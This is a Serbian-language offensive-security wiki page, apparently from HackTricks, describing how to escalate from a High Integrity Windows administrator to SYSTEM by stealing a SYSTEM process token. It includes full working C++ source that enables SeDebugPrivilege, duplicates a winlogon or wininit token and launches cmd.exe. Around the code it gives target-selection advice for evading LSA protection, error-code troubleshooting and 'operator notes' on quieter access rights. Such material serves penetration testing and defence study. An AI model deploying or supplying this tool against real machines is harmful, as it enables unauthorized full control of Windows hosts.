# SeImpersonate od High do System

{{#include ../../banners/hacktricks-training.md}}

Ova stranica opisuje **manual** način prelaska sa procesa administratora sa **High Integrity** nivoom na **`NT AUTHORITY\SYSTEM`** tako što se **otvara nezaštićeni SYSTEM proces, duplicira njegov token i pokreće child proces sa tim tokenom**.

Ako imate samo **`SeImpersonatePrivilege`** / **`SeAssignPrimaryTokenPrivilege`**, ali **ne možete da otvorite odgovarajući SYSTEM proces**, **Potato / named-pipe** putanja je obično pouzdanija:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

Ako vam nije potreban samo `SYSTEM`, već **SYSTEM token sa što je moguće više privilegija**, pogledajte i:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

## Brza provera

Pre pokušaja krađe tokena, brzo proverite kontekst:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege"
```
Praktične napomene:

- Administratorski token sa **High Integrity** obično je dovoljan za **omogućavanje `SeDebugPrivilege`** i otvaranje mnogih nezaštićenih SYSTEM procesa.
- **`CreateProcessWithTokenW` zahteva `SeImpersonatePrivilege`** kod pozivaoca. Ako taj API ne uspe sa greškom `1314`, pređite na `CreateProcessAsUserW` nakon što ste već duplicirali SYSTEM primarni token.
- Na modernom Windowsu, **`lsass.exe` je često loša meta** jer **LSA protection / PPL** blokira pristup čak i administratorima sa privilegijom `SeDebugPrivilege`. Prednost dajte procesima **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`** ili ranom **`svchost.exe`** procesu koji radi kao SYSTEM.
- Nemaju svi SYSTEM procesi podjednako koristan token. Ako dobijete SYSTEM, ali primetite da nedostaju privilegije, pokušajte sa drugim SYSTEM procesom umesto da pretpostavite da je tehnika neispravna.

## Pažljivo izaberite PID

Najlakši način da ovo pouzdano funkcioniše jeste da **izaberete SYSTEM proces čiji DACL zaista dozvoljava grupi Administrators da ispita proces i duplicira njegov token**.

Dobri kandidati za početno testiranje:

- `winlogon.exe`
- `wininit.exe`
- `services.exe`
- neke rane instance procesa `svchost.exe` koje rade kao SYSTEM

Podrazumevano izbegavajte:

- `lsass.exe` na hostovima na kojima je omogućena **RunAsPPL / LSA protection**
- zaštićene / bezbednosno osetljive procese koji vraćaju `Access denied` čak i nakon omogućavanja `SeDebugPrivilege`

Kandidate za procese i njihove tokene/ACL-ove možete pregledati pomoću alata **Process Explorer** ili **Process Hacker**, pokrenutih sa povišenim privilegijama.

### Kod

Sledeći kod potiče iz [ovog članka o access-tokenima](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962). Prihvata **ID procesa kao argument** i pokreće komandni shell **kao korisnik** tog procesa.<sup>[[3]](#references)</sup>\
Ako se izvršava u procesu sa **High Integrity**, možete **navesti PID procesa koji radi kao System** (kao što su `winlogon` i `wininit`) i izvršiti `cmd.exe` kao SYSTEM.<sup>[[3]](#references)</sup>
```cpp
impersonateuser.exe 1234
```

```cpp:impersonateuser.cpp
// From https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962

#include <windows.h>
#include <iostream>
#include <Lmcons.h>
BOOL SetPrivilege(
HANDLE hToken,          // access token handle
LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
BOOL bEnablePrivilege   // to enable or disable privilege
)
{
TOKEN_PRIVILEGES tp;
LUID luid;
if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
lpszPrivilege,   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
if (bEnablePrivilege)
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
else
tp.Privileges[0].Attributes = 0;
// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
return FALSE;
}
if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
{
printf("[-] The token does not have the specified privilege. \n");
return FALSE;
}
return TRUE;
}
std::string get_username()
{
TCHAR username[UNLEN + 1];
DWORD username_len = UNLEN + 1;
GetUserName(username, &username_len);
std::wstring username_w(username);
std::string username_s(username_w.begin(), username_w.end());
return username_s;
}
int main(int argc, char** argv) {
// Print whoami to compare to thread later
printf("[+] Current user is: %s\n", (get_username()).c_str());
// Grab PID from command line argument
char* pid_c = argv[1];
DWORD PID_TO_IMPERSONATE = atoi(pid_c);
// Initialize variables and structures
HANDLE tokenHandle = NULL;
HANDLE duplicateTokenHandle = NULL;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInformation;
ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
startupInfo.cb = sizeof(STARTUPINFO);
// Add SE debug privilege
HANDLE currentTokenHandle = NULL;
BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
{
printf("[+] SeDebugPrivilege enabled!\n");
}
// Call OpenProcess(), print return code and error code
HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
if (GetLastError() == NULL)
printf("[+] OpenProcess() success!\n");
else
{
printf("[-] OpenProcess() Return Code: %i\n", processHandle);
printf("[-] OpenProcess() Error: %i\n", GetLastError());
}
// Call OpenProcessToken(), print return code and error code
BOOL getToken = OpenProcessToken(processHandle, MAXIMUM_ALLOWED, &tokenHandle);
if (GetLastError() == NULL)
printf("[+] OpenProcessToken() success!\n");
else
{
printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
}
// Impersonate user in a thread
BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
if (GetLastError() == NULL)
{
printf("[+] ImpersonatedLoggedOnUser() success!\n");
printf("[+] Current user is: %s\n", (get_username()).c_str());
printf("[+] Reverting thread to original user context\n");
RevertToSelf();
}
else
{
printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
}
// Call DuplicateTokenEx(), print return code and error code
BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
if (GetLastError() == NULL)
printf("[+] DuplicateTokenEx() success!\n");
else
{
printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
}
// Call CreateProcessWithTokenW(), print return code and error code
BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
if (GetLastError() == NULL)
printf("[+] Process spawned!\n");
else
{
printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
}
return 0;
}
```
## Korisne napomene o API-jima / pravima pristupa

Primer koristi `MAXIMUM_ALLOWED`, ali za stvarne operacije korisno je zapamtiti minimalne potrebne delove:

- `OpenProcessToken()` zahteva samo da je **handle procesa** otvoren sa pravom **`PROCESS_QUERY_LIMITED_INFORMATION`**.
- Za korišćenje `CreateProcessWithTokenW()`, **handle primarnog tokena** mora imati prava **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**.<sup>[[1]](#references)</sup>
- `DuplicateTokenEx()` mora da kreira **primarni token** (`TokenPrimary`), a ne samo impersonation token.
- Ako ste već izvršili impersonation SYSTEM-a, a `CreateProcessWithTokenW()` i dalje ne uspeva sa greškom `1314`, pokušajte umesto toga sa `CreateProcessAsUserW()`.

To znači da je **otvaranje ciljnog procesa sa `PROCESS_ALL_ACCESS`** obično nepotrebno i bučnije nego jednostavno zahtevanje prava potrebnih za upit tokena.

## Greška

U nekim slučajevima možete pokušati da izvršite impersonation System-a, ali to neće raditi i prikazaće se izlaz poput sledećeg:
```cpp
[+] OpenProcess() success!
[+] OpenProcessToken() success!
[-] ImpersonatedLoggedOnUser() Return Code: 1
[-] ImpersonatedLoggedOnUser() Error: 5
[-] DuplicateTokenEx() Return Code: 0
[-] DupicateTokenEx() Error: 5
[-] CreateProcessWithTokenW Return Code: 0
[-] CreateProcessWithTokenW Error: 1326
```
To znači da čak i ako radite na nivou **High Integrity**, **nemate dovoljno dozvola** nad ciljnim procesom/tokenom.\
Proverimo trenutne dozvole grupe Administrator nad procesima `svchost.exe` pomoću alata **Process Explorer** (možete koristiti i **Process Hacker**):

1. Izaberite proces `svchost.exe`
2. Kliknite desnim tasterom miša --> Properties
3. Na kartici "Security" kliknite na dugme "Permissions" u donjem desnom uglu
4. Kliknite na "Advanced"
5. Izaberite "Administrators" i kliknite na "Edit"
6. Kliknite na "Show advanced permissions"

![Code - Greška: 6. Kliknite na "Show advanced permissions"](<../../images/image (437).png>)

Prethodna slika sadrži sve privilegije koje "Administrators" imaju nad izabranim procesom (kao što možete videti, u slučaju procesa `svchost.exe` imaju samo privilegije "Query")

Pogledajte privilegije koje "Administrators" imaju nad procesom `winlogon.exe`:

![Code - Greška: Pogledajte privilegije koje "Administrators" imaju nad procesom winlogon.exe](<../../images/image (1102).png>)

Unutar tog procesa "Administrators" mogu da koriste "Read Memory" i "Read Permissions", što verovatno omogućava grupi Administrators da impersonate token koji koristi ovaj proces.

### Uobičajeni uzroci neuspeha

- **`OpenProcess()` / `OpenProcessToken()` -> `5 (Access denied)`**: DACL procesa vas blokira ili je cilj **protected/PPL**. Izaberite drugi SYSTEM proces.
- **`DuplicateTokenEx()` -> `5 (Access denied)`**: vaš token handle je otvoren bez dovoljnog nivoa prava ili DACL ciljnog tokena sprečava njegovo dupliciranje.
- **`CreateProcessWithTokenW()` -> `1314`**: pozivalac trenutno nema omogućen **`SeImpersonatePrivilege`**. Prvo pokušajte da ga omogućite ili upotrebite `CreateProcessAsUserW()` sa dupliciranim primary tokenom.
- **`CreateProcessWithTokenW()` -> `1326`** nakon prethodnih neuspeha: ovo često samo znači da je prethodni korak dupliciranja/impersonation tokena neuspešan, pa ne postoji upotrebljiv primary token za pokretanje child procesa.

## Napomene za operatora

- Ova tehnika je odlična kada već imate **local admin + high integrity** i želite brz, ručni put do SYSTEM-a bez pokretanja service-a ili chain-a sa named pipe coercion-om.
- U hardened Windows 11 / Server okruženjima, **LSA protection je sve češća**, pa je workflow koji pretpostavlja da je `lsass.exe` uvek čitljiv nepouzdan. **`winlogon.exe` / `wininit.exe` / `services.exe` su obično bolji prvi izbori**.<sup>[[2]](#references)</sup>
- Ako dospete u kontekst **service account-a** umesto u elevated admin desktop, **Potato family** je obično prikladnija od ove stranice.



## References

- [1] [Microsoft: CreateProcessWithTokenW](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [2] [SensePost: Zloupotreba Windows tokena za kompromitovanje Active Directory-ja bez pristupanja LSASS-u](https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/)
- [3] [Razumevanje i zloupotreba Process Tokens — Part II](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962)
{{#include ../../banners/hacktricks-training.md}}
